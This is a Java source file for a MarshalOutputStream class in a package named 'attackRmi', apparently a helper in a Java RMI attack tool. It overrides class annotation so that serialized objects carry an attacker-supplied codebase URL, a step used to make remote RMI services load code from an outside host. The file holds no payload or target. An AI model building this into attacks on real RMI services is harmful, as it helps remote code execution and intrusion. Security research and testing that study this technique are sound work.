package com.wu.attackRmi.utils;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class MarshalOutputStream extends ObjectOutputStream {


    private URL sendUrl;

    public MarshalOutputStream (OutputStream out, URL u) throws IOException {
        super(out);
        this.sendUrl = u;
    }

    MarshalOutputStream ( OutputStream out ) throws IOException {
        super(out);
    }

    @Override
    protected void annotateClass ( Class<?> cl ) throws IOException {
        if ( this.sendUrl != null ) {
            writeObject(this.sendUrl.toString());
        } else if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
            writeObject(null);
        }
        else {
            URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
            String cb = "";

            for ( URL u : us ) {
                cb += u.toString();
            }
            writeObject(cb);
        }
    }


    /**
     * Serializes a location from which to load the specified class.
     */
    @Override
    protected void annotateProxyClass ( Class<?> cl ) throws IOException {
        annotateClass(cl);
    }
}
